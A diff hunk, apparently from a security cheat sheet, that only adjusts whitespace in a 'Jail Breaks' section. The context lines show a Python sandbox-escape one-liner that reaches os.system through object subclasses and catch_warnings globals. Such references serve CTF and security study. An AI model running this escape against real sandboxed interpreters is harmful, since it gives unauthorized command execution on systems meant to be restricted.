@@ -1004,7 +1004,7 @@ printf "$s\n" "${anything[@]}"
 Jail Breaks	
 ----------
 Sometimes you're jailed in an environment where you can potentially execute code.    
-* Python 3
+* Python 3    
 `().__class__.__base__.__subclasses__()` - Gives access to `object` subclasses    
 `[ c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == "catch_warnings"][0]().__repr__.__func__.__globals__["sys"].__dict__['modules']['os'].system("pwd")` - Exec system()
 
